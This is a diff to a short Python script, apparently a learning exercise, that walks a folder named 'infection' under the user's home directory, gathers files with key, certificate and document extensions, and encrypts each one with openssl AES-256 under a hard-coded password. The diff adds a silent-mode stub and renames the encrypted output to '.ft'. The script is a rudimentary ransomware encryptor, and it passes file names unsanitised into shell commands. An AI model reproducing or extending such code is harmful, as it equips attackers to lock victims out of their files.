@@ -1,4 +1,5 @@
 import os
+import sys
 from os import scandir, getcwd
 from os.path import abspath
 
@@ -8,11 +9,20 @@ extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.
 dir = os.environ['HOME']
 dir += '/infection'
 
-def encrypt(file_s):
+def encrypt(file_s, silent):
+    #restore = sys.stdout
+    #print ("HOLA OUT")
+    #if silent == True:
+    #    print ("HOLA IN")
+    #    f = open('/dev/null', 'w')
+    #    sys.stdout = f
     for obj in file_s:
-        command = str("openssl aes-256-cbc -in " + obj + " -pass pass:1234 -out " + obj + ".cript")
+        command = str("openssl aes-256-cbc -in " 
+                + obj + " -pass pass:1234 -out " 
+                + obj + ".ft")
         os.system(command)
-        print (command)
+        #os.system('ls')
+    #sys.stdout = restore
 
 dir_s = []
 files = []
@@ -32,5 +42,5 @@ for elem in os.walk(dir):
 for sub_d in dir_s:
     ls(sub_d)
 
-encrypt(files)
+encrypt(files, False)
 
